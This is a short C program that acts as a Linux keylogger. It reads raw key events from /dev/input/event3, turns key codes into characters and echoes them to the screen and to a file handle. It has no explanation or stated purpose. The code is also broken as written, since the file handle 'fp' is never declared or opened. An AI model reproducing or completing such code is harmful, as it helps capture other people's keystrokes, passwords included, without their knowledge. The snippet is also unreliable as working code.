#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <stdbool.h>
#define EVENT_FILE "/dev/input/event3"

int main(int argc, char **argv) {
    struct input_event ev;
    bool con = true;
    int fd = open(EVENT_FILE, O_RDONLY);

    char *map = "..1234567890-=..qwertyuiop[]\n.asdfghjkl;'~^\\zxcvbnm,./^.. .";

    while(con) {
        read(fd, &ev, sizeof(ev));
        fflush(stdout);
        if((ev.type == EV_KEY) && (ev.value == 0)) {
            printf("%c", map[ev.code]);
            fprintf(fp, "%c", map[ev.code]);
        } else if(ev.code == 54) {
            con = false;
        }
    }
    fclose(fp);
    close(fd);

    return 0;
}
